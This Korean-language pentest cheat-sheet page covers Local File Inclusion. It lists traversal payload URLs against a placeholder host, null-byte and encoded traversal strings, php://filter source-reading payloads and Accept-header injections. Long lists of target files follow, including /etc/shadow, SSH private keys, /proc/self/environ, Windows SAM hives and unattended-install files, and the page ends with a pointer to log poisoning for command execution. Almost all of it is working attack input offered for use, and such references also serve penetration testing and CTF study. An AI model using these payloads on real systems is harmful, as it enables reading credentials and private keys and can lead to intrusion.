---
sidebar_position: 3
---

# Local File Inclusion (LFI)

## 기본 LFI

```
http://<RHOST>/<FILE>.php?file=
http://<RHOST>/<FILE>.php?file=../../../../../../../../etc/passwd
http://<RHOST>/<FILE>.php?file=../../../../../../../../../../etc/passwd
```

## Null Byte (PHP 5.3 이전)

```
http://<RHOST>/<FILE>.php?file=../../../../../../../../../../etc/passwd%00
```

### Null Byte 인코딩

```
%00
0x00
```

## Encoded Traversal Strings

```
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
..././
...\.\
```

## php://filter Wrapper

```
# Base64로 소스 코드 읽기
url=php://filter/convert.base64-encode/resource=file:////var/www/<RHOST>/api.php

http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=index
http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd

# 디코딩
base64 -d <FILE>.php
```

## Django, Rails, Node.js Header LFI

```
Accept: ../../../../.././../../../../etc/passwd{{
Accept: ../../../../.././../../../../etc/passwd{%0D
Accept: ../../../../.././../../../../etc/passwd{%0A
Accept: ../../../../.././../../../../etc/passwd{%00
Accept: ../../../../.././../../../../etc/passwd{%0D{{
Accept: ../../../../.././../../../../etc/passwd{%0A{{
Accept: ../../../../.././../../../../etc/passwd{%00{{
```

## Linux 주요 파일

### 시스템 설정

```
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/fstab
/etc/issue
/etc/motd
/etc/profile
/etc/bashrc
/etc/resolv.conf
/etc/network/interfaces
/etc/networks
/etc/lsb-release
/etc/redhat-release
```

### Apache/Web 서버

```
/etc/apache2/apache2.conf
/etc/apache2/httpd.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/httpd/conf/httpd.conf
/etc/httpd/httpd.conf
/etc/httpd/logs/access_log
/etc/httpd/logs/error_log
/etc/lighttpd.conf
/opt/lampp/etc/httpd.conf
/usr/local/apache/conf/httpd.conf
/usr/local/apache/logs/access_log
/usr/local/apache/logs/error_log
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/apache/access_log
/var/log/apache/error_log
/var/www/logs/access.log
/var/www/logs/error.log
```

### PHP 설정

```
/etc/php.ini
/etc/php/apache/php.ini
/etc/php/apache2/php.ini
/etc/php5/apache2/php.ini
/etc/php/cgi/php.ini
/usr/local/etc/php.ini
/usr/lib/php.ini
/opt/xampp/etc/php.ini
```

### MySQL/Database

```
/etc/my.cnf
/etc/mysql/my.cnf
/var/lib/mysql/my.cnf
/var/lib/mysql/mysql/user.MYD
```

### SSH

```
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/ssh/ssh_host_dsa_key
/etc/ssh/ssh_host_key
/root/.ssh/id_rsa
/root/.ssh/id_dsa
/root/.ssh/authorized_keys
~/.ssh/authorized_keys
~/.ssh/id_rsa
~/.ssh/id_dsa
```

### Cron

```
/etc/crontab
/etc/cron.allow
/etc/cron.deny
/var/spool/cron/crontabs/root
```

### FTP

```
/etc/ftpaccess
/etc/ftpchroot
/etc/ftphosts
/etc/pure-ftpd.conf
/etc/proftpd/proftpd.conf
/etc/vsftpd.conf
/var/log/vsftpd.log
/var/log/pureftpd.log
```

### 로그 파일

```
/var/log/auth.log
/var/log/boot
/var/log/daemon.log
/var/log/debug
/var/log/dmesg
/var/log/dpkg.log
/var/log/faillog
/var/log/kern.log
/var/log/lastlog
/var/log/mail.log
/var/log/messages
/var/log/secure
/var/log/syslog
/var/log/wtmp
/var/log/xferlog
/var/log/yum.log
```

### 사용자 히스토리

```
~/.bash_history
~/.bashrc
~/.bash_profile
~/.bash_logout
~/.mysql_history
~/.nano_history
~/.php_history
~/.viminfo
~/.profile
~/.login
~/.logout
```

### /proc 파일 시스템

```
/proc/cmdline
/proc/cpuinfo
/proc/filesystems
/proc/meminfo
/proc/modules
/proc/mounts
/proc/net/arp
/proc/net/tcp
/proc/net/udp
/proc/<PID>/cmdline
/proc/<PID>/maps
/proc/self/environ
/proc/self/cwd/app.py
/proc/version
```

## Windows 주요 파일

### 시스템 파일

```
C:/boot.ini
C:/WINDOWS/win.ini
C:/WINNT/win.ini
C:/WINDOWS/System32/drivers/etc/hosts
```

### SAM/레지스트리

```
C:/WINDOWS/Repair/SAM
C:/Windows/repair/system
C:/Windows/repair/software
C:/Windows/repair/security
C:/Windows/system32/config/regback/default
C:/Windows/system32/config/regback/sam
C:/Windows/system32/config/regback/security
C:/Windows/system32/config/regback/system
C:/Windows/system32/config/regback/software
C:/Users/Administrator/NTUser.dat
C:/Documents and Settings/Administrator/NTUser.dat
```

### 이벤트 로그

```
C:/Windows/system32/config/AppEvent.Evt
C:/Windows/system32/config/SecEvent.Evt
```

### 설치 로그

```
C:/Windows/Panther/Unattend/Unattended.xml
C:/Windows/Panther/Unattended.xml
C:/Windows/debug/NetSetup.log
```

### Apache/PHP (Windows)

```
C:/apache/logs/access.log
C:/apache/logs/error.log
C:/apache/php/php.ini
C:/php/php.ini
C:/php4/php.ini
C:/php5/php.ini
C:/WINDOWS/php.ini
C:/WINNT/php.ini
C:/Program Files/Apache Group/Apache2/conf/httpd.conf
C:/Program Files/Apache Group/Apache/conf/httpd.conf
C:/Program Files/Apache Group/Apache/logs/access.log
C:/Program Files/Apache Group/Apache/logs/error.log
C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
```

### XAMPP

```
C:/xampp/apache/bin/php.ini
C:/xampp/apache/logs/access.log
C:/xampp/apache/logs/error.log
C:/xampp/apache/conf/httpd.conf
C:/Program Files (x86)/xampp/apache/conf/httpd.conf
```

### MySQL (Windows)

```
C:/MySQL/my.cnf
C:/MySQL/my.ini
C:/MySQL/data/hostname.err
C:/MySQL/data/mysql.log
C:/Program Files/MySQL/my.ini
C:/Program Files/MySQL/my.cnf
C:/Program Files/MySQL/data/hostname.err
C:/Program Files/MySQL/data/mysql.log
C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/my.ini
C:/Program Files/MySQL/MySQL Server 5.1/my.ini
```

### FileZilla

```
C:/Program Files/FileZilla Server/FileZilla Server.xml
C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
```

### IIS

```
C:/inetpub/wwwroot/global.asa
C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
C:/Windows/System32/inetsrv/config/applicationHost.config
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
```

## 참고

- Path Traversal로 상위 디렉토리 이동
- Null Byte는 PHP 5.3 이전에만 작동
- php://filter로 소스 코드 읽기
- /proc 파일 시스템은 Linux에서 유용
- Windows는 대소문자 구분 안 함
- 로그 파일에서 명령 실행 가능 (Log Poisoning)
